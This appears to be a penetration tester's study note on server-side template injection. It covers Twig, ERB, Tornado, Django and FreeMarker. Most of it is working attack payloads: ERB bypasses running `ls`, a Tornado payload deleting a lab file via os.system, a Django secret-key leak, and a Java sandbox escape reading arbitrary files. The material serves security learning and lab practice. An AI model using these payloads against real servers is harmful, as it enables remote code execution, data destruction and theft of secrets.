**Server-side Template Injection** is when an attacker is able to use *native template syntax* to *inject a malicious payload into a template* which is then executed server-side.

```php
# Not Vulnerable ❌
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );

# Vulnerable ✅
$output = $twig->render("Dear " . $_GET['name']);
```

First code is *not vulnerable* to server-side template injection because the user's first name is merely *passed into the template as data*.
Second code is vulnerable because *part of the template itself is being dynamically generated* using the GET parameter name.

---
# Web Template Engines
| Template Name | Language                     |
| ------------- | ---------------------------- |
| FreeMarker    | Java-based template engine   |
| Velocity      | Java-based template engine   |
| Twig          | PHP template engine          |
| Smarty        | PHP template engine          |
| Jade          | Node.js template engine      |
| Jinja2        | Python/Flask template engine |
| ERB           | Ruby template engine         |
| Tornado       | Python template engine       |
| Handlebars    | NodeJS template engine       |

# Payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
https://www.pwny.cc/web-attacks/server-side-template-injection-ssti

---
## ERB Template
```rb
# Example
require 'erb'

x = 42
template = ERB.new <<-EOF
  The value of x is: <%= x %>
EOF
puts template.result(binding)
```

###### Recognized Tags
```rb
<% Ruby code -- inline with output %>
<%= Ruby expression -- replace with result %>
<%# comment -- ignored -- useful in testing %>
% a line of Ruby code -- treated as <% line %> (optional -- see ERB.new)
%% replaced with % if first thing on a line and % processing is used
<%% or %%> -- replace with <% or %> respectively
```


#### Bypass
```ruby
# Line break URLencoded
%7B%7B%0d%0a`ls`%7D%7D

# Line jump
test%3C%25%3D%20%60ls%20%2F%60%20%25%3Etest
```


## Tornado Template
https://ajinabraham.com/blog/server-side-template-injection-in-tornado

**Bypass {{ }}** :-
1) Method 1
	- `user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
	- So final argument becomes `{{user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')}}`

2) Method 2:-
	- Use Python's inbuilt module function
	- `__import__('os').system('whoami')`



## Handlebars NodeJS
URL encode the exploit code!


## Django
Find the framework's *secret key*
```python
{{settings.SECRET_KEY}}
```

---
# Sandbox Bypass Payloads
https://www.pwny.cc/web-attacks/server-side-template-injection-ssti

```java
// Here, product is the object being referred to (Change it according to what object you want to refer to)
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
```
